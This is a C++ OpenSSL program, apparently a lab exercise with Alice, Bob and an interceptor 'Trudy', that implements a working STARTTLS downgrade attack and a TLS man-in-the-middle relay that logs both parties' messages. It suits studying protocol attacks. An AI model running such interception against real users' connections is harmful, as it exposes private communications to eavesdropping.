#include <iostream>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <errno.h>
#include <resolv.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <openssl/err.h>
#include <openssl/ssl.h>
#include <netdb.h>
#include "constants.cpp"
using namespace std;
#define BUF_SIZE BUF_SIZE

// command line info messages
string err_msg = "Pass <-m peer1 peer2> arguments for man in the middle and <-s> for server and <-c host_name> for client";

// boolean for checking if user is server or client
bool is_server = false;

// cleanup loaded ciphers, algos, digests lists
void cleanup_openssl()
{
    EVP_cleanup();
}

// Initializing OpenSSL algos, error messages
void init_openssl() {
	// loading all error messages
	SSL_load_error_strings();
	// loading all BIO messages
	ERR_load_BIO_strings();
	// loading all algorithms
	OpenSSL_add_all_algorithms();
}


// Creating server socket
int create_server_socket(int port) {

	int s;
	// declaring address for server
	struct sockaddr_in addr;
	// setting server address
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = htonl(INADDR_ANY);

	// creating TCP socket for listening
	s = socket(AF_INET, SOCK_STREAM, 0);
	if(s < 0 ) {
		perror("Unable to create socket");
		exit(EXIT_FAILURE);
	}
	// binding addr to socket
	if(bind(s, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
		perror("Unable to bind");
		exit(EXIT_FAILURE);
	}

	// listening to only single connection
	if(listen(s, MAX_CONNECTIONS_SERVER_LISTEN) < 0) {
		perror("Unable to listen");
		exit(EXIT_FAILURE);
	}

	cout<<"Listening on "<<port<<"...\n";

	return s;
}


// Creating client socket
int create_client_socket(char* host_name, int port) {
	int s;
	// declaring address for server
	struct sockaddr_in addr;

	// get hostent structure from host_name
	struct hostent *host = gethostbyname(host_name);
	
	if(host == NULL)
	{
		perror(host_name);
		exit(EXIT_FAILURE);
	}

	// setting server address
	bzero(&addr, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = *(long *)(host->h_addr);

	char ip_str[INET_ADDRSTRLEN];
	inet_ntop(AF_INET, &(addr.sin_addr), ip_str, INET_ADDRSTRLEN);
	printf("Host IP is %s\n", ip_str);

	// creating socket 
	s = socket(AF_INET, SOCK_STREAM, 0);
	if(s < 0 ) {
		perror("Unable to create socket");
		exit(EXIT_FAILURE);
	}

	// connecting to server
	int connect_status_code = connect(s, (struct sockaddr*)&addr, sizeof(addr));
	if(connect_status_code < 0) {
		perror("Unable to connect");
		exit(EXIT_FAILURE);
	}
	cout<<"Connected to "<<host_name<<"...\n";

	return s;
}

// create SSL context
SSL_CTX* create_context() {
	const SSL_METHOD* method;
	SSL_CTX* ctx;
	
	// instantiate new server/client method depending upon type of user
	if(is_server) {
		method = TLS_server_method();
	} else {
		method = TLS_client_method();
	}

	// instantiate context from method
	ctx = SSL_CTX_new(method);

	if(!ctx) {
		perror("Unable to create SSL context");
		ERR_print_errors_fp(stderr);
		exit(EXIT_FAILURE);
	}
	return ctx;
}


// configuring SSL context 
void configure_context(SSL_CTX* ctx) {

	const char* cert_file_name = NULL;
	const char* key_file_name = NULL;

	// setting cert and key file names depending on type of user
	if(is_server) {
		cert_file_name = SERVER_CERT_FILE_NAME;
		key_file_name = SERVER_KEY_FILE_NAME;
	} else {
		cert_file_name = CLIENT_CERT_FILE_NAME;
		key_file_name = CLIENT_KEY_FILE_NAME;
	}

	// set the certificate file
	if(SSL_CTX_use_certificate_file(ctx, cert_file_name, SSL_FILETYPE_PEM) <= 0) {
		ERR_print_errors_fp(stderr);
		exit(EXIT_FAILURE);
	} 

	// set the private key file
	if(SSL_CTX_use_PrivateKey_file(ctx, key_file_name, SSL_FILETYPE_PEM) <= 0) {
		ERR_print_errors_fp(stderr);
		exit(EXIT_FAILURE);
	}
	
	// checking compliance of private key with certificate
	if(!SSL_CTX_check_private_key(ctx)) {
		fprintf(stderr, "Private key doesn't comply with the certificate\n");
		abort();
	}

	// Loading trust certificate stores
	// second param is path and filename of trust store file
	// third param is path to directory of certificates
	if(! SSL_CTX_load_verify_locations(ctx, "root.crt", NULL))
	{
	    cout<<"SSL_CTX_load_verify_locations done\n";
	}

	// SSL_VERIFY_PEER ensures that server and client both 
	// send certificates to each other to ensure mutual authentication
	SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, NULL);
}


// display peer certificates
void display_certificates(SSL* ssl) {
	X509* certificate;
	certificate = SSL_get_peer_certificate(ssl);
	if(!certificate) {
		fprintf(stderr, "Empty certificate\n");
		abort();
	}
	// print the subject name
	cout<<"Peer certificate"<<endl;
	char* subject_name;
	subject_name = X509_NAME_oneline(X509_get_subject_name(certificate), 0, 0);
	cout<<"Subject: "<<subject_name<<endl;
	
	// print the issuer name
	char* issuer_name;
	issuer_name = X509_NAME_oneline(X509_get_issuer_name(certificate), 0, 0);
	cout<<"Issuer: "<<issuer_name<<endl;

	X509_free(certificate);
}

int main(int argc, char** argv) {
	char alice_msg[BUF_SIZE]; // messages exchanged between alice and trudy
	char bob_msg[BUF_SIZE]; // messages exchanged beteween trudy and bob
	char* host_name; // host name of server which client desires to connect
	int n, bytes_read;
	char *peer1, *peer2; // peer1 and peer2 are the two entites (alice and bob) whose connection trudy is intercepting
	init_openssl();
	// declaring ssl object
	SSL* alice_ssl, *bob_ssl;

	// declaring ssl context object
	SSL_CTX* alice_ctx, *bob_ctx;
	int flag = -1; // 0 for trudy, 1 for client (alice), 2 for server (bob)

	if(argc == 1) {
		cout<<err_msg<<endl;
		return 1;
	} else {
		if(argc == 2) {
			if(string(argv[1]) == "-s") {
				flag = 2;
			} else {
				cout<<err_msg<<endl;
				return 1;
			}
		} else if(argc == 3) {
			if(string(argv[1]) == "-c") {
				flag = 1;
				host_name = argv[2];
			} else {
				cout<<err_msg<<endl;
				return 1;
			}
		} else if(argc == 4) {
			if(string(argv[1]) == "-d") {
				flag = 0;
				peer1 = argv[2];
				peer2 = argv[3];
			} 
			else if(string(argv[1]) == "-m") {
				flag = 5;
				peer1 = argv[2];
				peer2 = argv[3];
			}
			else{
				cout<<err_msg<<endl;
				return 1;
			}




		} else {
			cout<<err_msg<<endl;
			return 1;
		}
	}

	if(flag == 0) {
		// **************** MITM (TRUDY) ***********************

		int alice_sock, bob_sock, sock;


		// Trudy acts as server for alice
		// creating socket to communicate with alice
		sock = create_server_socket(MITM_LISTEN_PORT);

		// declaring address for client
		struct sockaddr_in client_addr;
		uint len = sizeof(client_addr);

		// Trudy accepts alice connection
		alice_sock = accept(sock, (struct sockaddr*)&client_addr, &len);	
		if(alice_sock < 0) {
				perror("Unable to accept");
				exit(EXIT_FAILURE);
		}
		char ip_str[INET_ADDRSTRLEN];
		inet_ntop(AF_INET, &(client_addr.sin_addr), ip_str, INET_ADDRSTRLEN);
		printf("Connected to client with IP %s\n", ip_str);

		// Trudy acts as client for bob
		// creating socket for communication with bob
		bob_sock = create_client_socket(peer2, SERVER_LISTEN_PORT);

		// Trudy receives "chat_hello" from alice
		bzero(alice_msg, BUF_SIZE);
		bytes_read = read(alice_sock, alice_msg, BUF_SIZE);
		if(bytes_read > 0) {
			cout<<"Received from " <<peer1<<"\n"<<alice_msg;
		} else {
			ERR_print_errors_fp(stderr);
		}

		cout<<"Forwarding "<<" to "<<peer2<<" "<<alice_msg;
		// Trudy forwards "chat_hello" received from alice to bob
		write(bob_sock, alice_msg, BUF_SIZE);

		// Trudy receives "chat_reply" from Bob
		bzero(bob_msg, BUF_SIZE);
		bytes_read = read(bob_sock, bob_msg, BUF_SIZE);
		if(bytes_read > 0) {
			cout<<"Received from " <<peer2<<"\n"<<alice_msg;
		} else {
			ERR_print_errors_fp(stderr);
		}

		// Trudy forwards "chat_reply" received from bob to alice
		cout<<"Forwarding "<<" to "<<peer1<<" "<<bob_msg;
		write(alice_sock, bob_msg, BUF_SIZE);

		// Trudy receives "chat_STARTTLS" from alice
		bzero(alice_msg, BUF_SIZE);
		bytes_read = read(alice_sock, alice_msg, BUF_SIZE);
		if(bytes_read > 0) {
			cout<<"Received from " <<peer1<<"\n"<<alice_msg;
		} else {
			ERR_print_errors_fp(stderr);
		}

		// Trudy sends "chat_STARTTLS_NOT_SUPPORTED" to alice
		bzero(alice_msg, BUF_SIZE);
		strcpy(alice_msg, "chat_STARTTLS_NOT_SUPPORTED\n");
		cout<<"Sending to "<<peer1<<" "<<alice_msg<<endl;
		write(alice_sock, alice_msg, BUF_SIZE);

		// Trudy successfully launched downgrade attack
		// Communication between alice and bob is unsecure

		while(true) {
			// Trudy receives message from alice
			bzero(alice_msg, BUF_SIZE);
			bytes_read = read(alice_sock, alice_msg, BUF_SIZE);
			if(bytes_read > 0) {
				cout<<"Received from " <<peer1<<"\n"<<alice_msg;
			} else {
				ERR_print_errors_fp(stderr);
			}

			cout<<"Forwarding "<<" to "<<peer2<<" "<<alice_msg;
			// Trudy forwards message received from alice to bob
			write(bob_sock, alice_msg, BUF_SIZE);

			// terminate connection if alice sends chat_close
			if(!strcmp(alice_msg, "chat_close\n")) break;

			// Trudy receives message from Bob
			bzero(bob_msg, BUF_SIZE);
			bytes_read = read(bob_sock, bob_msg, BUF_SIZE);
			if(bytes_read > 0) {
				cout<<"Received from " <<peer2<<"\n"<<bob_msg;
			} else {
				ERR_print_errors_fp(stderr);
			}

			// Trudy forwards message received from bob to alice
			cout<<"Forwarding "<<" to "<<peer1<<" "<<bob_msg;
			write(alice_sock, bob_msg, BUF_SIZE);

			// terminate connection if bob sends chat_close
			if(!strcmp(bob_msg, "chat_close\n")) break;
		}
	} else if(flag == 1) {
		// **************** CLIENT (ALICE) ***********************

		// creating socket 
		int sock = create_client_socket(host_name, MITM_LISTEN_PORT);

		// client sends "chat_hello"
		bzero(alice_msg, BUF_SIZE);
		n = 0;
		cout<<"Write your message:\n";
		while((alice_msg[n++] = getchar()) != '\n');
		write(sock, alice_msg, BUF_SIZE);

		// client receives "chat_reply"
		bzero(bob_msg, BUF_SIZE);
		bytes_read = read(sock, bob_msg, BUF_SIZE);
		if(bytes_read > 0) {
			cout<<"Received from server:\n"<<bob_msg;
		} else {
			ERR_print_errors_fp(stderr);
		}

		// client sends "chat_STARTTLS"
		bzero(alice_msg, BUF_SIZE);
		n = 0;
		cout<<"Write your message:\n";
		while((alice_msg[n++] = getchar()) != '\n');
		write(sock, alice_msg, BUF_SIZE);

		// client receives "chat_STARTTLS_NOT_SUPPORTED"
		bzero(bob_msg, BUF_SIZE);
		bytes_read = read(sock, bob_msg, BUF_SIZE);
		if(bytes_read > 0) {
			cout<<"Received from server:\n"<<bob_msg;
		} else {
			ERR_print_errors_fp(stderr);
		}

		// Thus Alice now communicates with Bob insecurely
		// that is communication is no longer TLS secured

		while(true) {
			// client sends message
			bzero(alice_msg, BUF_SIZE);
			n = 0;
			cout<<"Write your message:\n";
			while((alice_msg[n++] = getchar()) != '\n');
			write(sock, alice_msg, BUF_SIZE);
			// terminate connection if alice sends chat_close
			if(!strcmp(alice_msg, "chat_close\n")) break;

			// client receives message
			bzero(bob_msg, BUF_SIZE);
			bytes_read = read(sock, bob_msg, BUF_SIZE);
			if(bytes_read > 0) {
				cout<<"Received from server:\n"<<bob_msg;
			} else {
				ERR_print_errors_fp(stderr);
			}
			// terminate connection if bob sends chat_close
			if(!strcmp(bob_msg, "chat_close\n")) break;
		}

	}else if(flag == 5) {

		int alice_sock, bob_sock, sock;

		is_server = true;
		// Trudy acts as server for alice
		// creating socket to communicate with alice
		sock = create_server_socket(MITM_LISTEN_PORT);

		// declaring address for client
		struct sockaddr_in client_addr;
		uint len = sizeof(client_addr);

		// Trudy accepts alice connection
		alice_sock = accept(sock, (struct sockaddr*)&client_addr, &len);	
		if(alice_sock < 0) {
				perror("Unable to accept");
				exit(EXIT_FAILURE);
		}

		char ip_str[INET_ADDRSTRLEN];
		inet_ntop(AF_INET, &(client_addr.sin_addr), ip_str, INET_ADDRSTRLEN);
		printf("Connected to client with IP %s\n", ip_str);

		// Trudy acts as client for bob
		// creating socket for communication with bob
		bob_sock = create_client_socket(peer2, SERVER_LISTEN_PORT);

		// Trudy receives "chat_hello" from alice
		bzero(alice_msg, BUF_SIZE);
		bytes_read = read(alice_sock, alice_msg, BUF_SIZE);
		if(bytes_read > 0) {
			cout<<"Received from " <<peer1<<"\n"<<alice_msg;
		} else {
			ERR_print_errors_fp(stderr);
		}

		cout<<"Forwarding "<<" to "<<peer2<<" "<<alice_msg;
		// Trudy forwards "chat_hello" received from alice to bob
		write(bob_sock, alice_msg, BUF_SIZE);

		// Trudy receives "chat_reply" from Bob
		bzero(bob_msg, BUF_SIZE);
		bytes_read = read(bob_sock, bob_msg, BUF_SIZE);
		if(bytes_read > 0) {
			cout<<"Received from " <<peer2<<"\n"<<alice_msg;
		} else {
			ERR_print_errors_fp(stderr);
		}

		// Trudy forwards "chat_reply" received from bob to alice
		cout<<"Forwarding "<<" to "<<peer1<<" "<<bob_msg;
		write(alice_sock, bob_msg, BUF_SIZE);

		// Trudy receives "chat_STARTTLS" from alice
		bzero(alice_msg, BUF_SIZE);
		bytes_read = read(alice_sock, alice_msg, BUF_SIZE);
		if(bytes_read > 0) {
			cout<<"Received from " <<peer1<<"\n"<<alice_msg;
		} else {
			ERR_print_errors_fp(stderr);
		}

		// Trudy forwards "chat_STARTTLS" received from alice to bob
		cout<<"Forwarding "<<" to "<<peer2<<" "<<alice_msg;
		write(bob_sock, alice_msg, BUF_SIZE);


		// Trudy receives "chat_STARTTLS_ACK" from Bob
		bzero(bob_msg, BUF_SIZE);
		bytes_read = read(bob_sock, bob_msg, BUF_SIZE);
		if(bytes_read > 0) {
			cout<<"Received from " <<peer2<<"\n"<<alice_msg;
		} else {
			ERR_print_errors_fp(stderr);
		}

		// Trudy forwards "chat_STARTTLS_ACK" received from bob to alice
		cout<<"Forwarding "<<" to "<<peer1<<" "<<bob_msg;
		write(alice_sock, bob_msg, BUF_SIZE);

		// creating ssl context for alice
		alice_ctx = create_context();
		cout<<"Alice SSL context created...\n";
		// configuring ssl context by loading certs, keys,..
		configure_context(alice_ctx);
		cout<<"Alice Context configured...\n";

		// now trudy is client to bob
		is_server = false;

		// creating ssl context for bob
		bob_ctx = create_context();
		cout<<"Bob SSL context created...\n";
		// configuring ssl context by loading certs, keys,..
		configure_context(bob_ctx);
		cout<<"Bob Context configured...\n";

		// creating ssl object with given context for alice
		alice_ssl = SSL_new(alice_ctx);

		// creating ssl object with given context for bob
		bob_ssl = SSL_new(bob_ctx);

		// setting the file descriptor of alice socket with alice ssl
		SSL_set_fd(alice_ssl, alice_sock);

		// setting the file descriptor of bob socket with bob ssl
		SSL_set_fd(bob_ssl, bob_sock);

		// trudy accepts alice secure TLS connection 
		if(SSL_accept(alice_ssl) <= 0) {
			ERR_print_errors_fp(stderr);
		} else {
			// trudy tries to securely connect to bob
			if(SSL_connect(bob_ssl) <= 0) {
				ERR_print_errors_fp(stderr);
			}

			// displaying alice certificates
			cout<<"Displaying alice peer certificates...\n";
			display_certificates(alice_ssl);

			// displaying bob certificates
			cout<<"Displaying bob peer certificates...\n";
			display_certificates(bob_ssl);

			// returns the result of the verification of the X509 certificate presented by the peer
			if(SSL_get_verify_result(alice_ssl) == X509_V_OK) {
			    cout<<"Alice Certificate verification passed\n";
			} else {
				cout<<"Alice Certificate verification failed\n";
			}

			// returns the result of the verification of the X509 certificate presented by the peer
			if(SSL_get_verify_result(bob_ssl) == X509_V_OK) {
			    cout<<"Bob Certificate verification passed\n";
			} else {
				cout<<"Bob Certificate verification failed\n";
			}

			// printing SSL version used in connection
			cout<<"Alice SSL version used: ";
			cout<<SSL_get_version(alice_ssl)<<endl;

			// printing SSL version used in connection
			cout<<"Bob SSL version used: ";
			cout<<SSL_get_version(bob_ssl)<<endl;

			while(true) {
				// Trudy receives message from alice
				bzero(alice_msg, BUF_SIZE);
				bytes_read = SSL_read(alice_ssl, alice_msg, BUF_SIZE);
				if(bytes_read > 0) {
					cout<<"Received from " <<peer1<<"\n"<<alice_msg;
				} else {
					ERR_print_errors_fp(stderr);
				}

				cout<<"Forwarding "<<" to "<<peer2<<" "<<alice_msg;
				// Trudy forwards message received from alice to bob
				SSL_write(bob_ssl, alice_msg, BUF_SIZE);

				// terminate connection if alice sends chat_close
				if(!strcmp(alice_msg, "chat_close\n")) break;

				// Trudy receives message from Bob
				bzero(bob_msg, BUF_SIZE);
				bytes_read = SSL_read(bob_ssl, bob_msg, BUF_SIZE);
				if(bytes_read > 0) {
					cout<<"Received from " <<peer2<<"\n"<<bob_msg;
				} else {
					ERR_print_errors_fp(stderr);
				}

				// Trudy forwards message received from bob to alice
				cout<<"Forwarding "<<" to "<<peer1<<" "<<bob_msg;
				SSL_write(alice_ssl, bob_msg, BUF_SIZE);

				// terminate connection if bob sends chat_close
				if(!strcmp(bob_msg, "chat_close\n")) break;
			}
		}
		
		// close the socket associated for listening
		close(alice_sock);
		close(bob_sock);
		close(sock);

	} else {
		// **************** SERVER (BOB) ***********************

		// create socket
		int sock = create_server_socket(SERVER_LISTEN_PORT);

		// declaring address for client
		struct sockaddr_in client_addr;
		uint len = sizeof(client_addr);

		// server accepts client connection
		int client = accept(sock, (struct sockaddr*)&client_addr, &len);
		if(client < 0) {
				perror("Unable to accept");
				exit(EXIT_FAILURE);
		}
		char ip_str[INET_ADDRSTRLEN];
		inet_ntop(AF_INET, &(client_addr.sin_addr), ip_str, INET_ADDRSTRLEN);
		printf("Connected to client with IP %s\n", ip_str);

		while(true) {
			// server receives message
			bzero(alice_msg, BUF_SIZE);
			bytes_read = read(client, alice_msg, BUF_SIZE);
			if(bytes_read > 0) {
				cout<<"Received from client:\n"<<alice_msg;
			} else {
				ERR_print_errors_fp(stderr);
			}
			// terminate connection if alice sends chat_close
			if(!strcmp(alice_msg, "chat_close\n")) break;

			// server sends message
			bzero(bob_msg, BUF_SIZE);
			n = 0;
			cout<<"Write your message:\n";
			while((bob_msg[n++] = getchar()) != '\n');
			write(client, bob_msg, BUF_SIZE);
			// terminate connection if bob sends chat_close
			if(!strcmp(bob_msg, "chat_close\n")) break;
		}
	}

	return 0;
}